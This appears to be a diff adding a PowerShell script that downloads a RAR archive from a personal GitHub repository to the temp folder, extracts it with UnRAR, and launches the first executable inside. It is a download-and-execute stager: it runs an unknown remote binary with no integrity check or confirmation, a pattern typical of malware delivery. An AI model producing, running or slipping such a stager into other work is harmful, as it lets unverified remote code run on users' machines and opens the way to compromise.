@@ -1,0 +1,66 @@
+<#
+.SYNOPSIS
+    Download mouse.exe.rar from GitHub, extract with WinRAR, and run the EXE.
+#>
+
+$ErrorActionPreference = 'Stop'
+
+# ---------- Configuration ----------
+$RawUrl      = 'https://github.com/sahilvetrix-tech/mouse.exe/raw/refs/heads/main/mouse.exe.rar'
+$RarFile     = "$env:TEMP\mouse.exe.rar"
+$ExtractDir  = "$env:TEMP\mouse_extracted"
+# -----------------------------------
+
+# Locate UnRAR.exe (bundled with WinRAR)
+$UnRarPaths = @(
+    "${env:ProgramFiles}\WinRAR\UnRAR.exe",
+    "${env:ProgramFiles(x86)}\WinRAR\UnRAR.exe",
+    "${env:LOCALAPPDATA}\Programs\WinRAR\UnRAR.exe"
+)
+
+$UnRarExe = $null
+foreach ($p in $UnRarPaths) {
+    if (Test-Path $p) {
+        $UnRarExe = $p
+        break
+    }
+}
+
+if (-not $UnRarExe) {
+    Write-Error "[-] WinRAR / UnRAR.exe not found. Please install WinRAR or use the 7-Zip variant."
+    exit 1
+}
+
+Write-Host "[+] Found UnRAR at: $UnRarExe" -ForegroundColor Green
+
+Write-Host "[*] Creating extraction directory..." -ForegroundColor Cyan
+Remove-Item -Path $ExtractDir -Recurse -Force -ErrorAction SilentlyContinue
+New-Item -Path $ExtractDir -ItemType Directory -Force | Out-Null
+
+Write-Host "[*] Downloading RAR archive from GitHub..." -ForegroundColor Cyan
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Invoke-WebRequest -Uri $RawUrl -OutFile $RarFile -UseBasicParsing
+Write-Host "[+] Downloaded to: $RarFile ($([math]::Round((Get-Item $RarFile).Length / 1MB, 2)) MB)" -ForegroundColor Green
+
+Write-Host "[*] Extracting with WinRAR..." -ForegroundColor Cyan
+$extractArgs = @('x', "-o+", "`"$RarFile`"", "`"$ExtractDir\`"")
+$proc = Start-Process -FilePath $UnRarExe -ArgumentList $extractArgs -NoNewWindow -Wait -PassThru
+if ($proc.ExitCode -ne 0) {
+    Write-Error "[-] Extraction failed with exit code: $($proc.ExitCode)"
+    exit 1
+}
+Write-Host "[+] Extraction complete." -ForegroundColor Green
+
+# ---------- Locate and run the EXE ----------
+$exeFiles = Get-ChildItem -Path $ExtractDir -Recurse -Filter '*.exe' -File
+if ($exeFiles.Count -eq 0) {
+    Write-Error "[-] No .exe file found in extracted archive."
+    exit 1
+}
+
+$targetExe = $exeFiles[0].FullName
+Write-Host "[+] Found executable: $targetExe" -ForegroundColor Green
+Write-Host "[*] Launching executable..." -ForegroundColor Cyan
+Start-Process -FilePath $targetExe -WindowStyle Normal
+
+Write-Host "[+] Done. Executable is running." -ForegroundColor Green
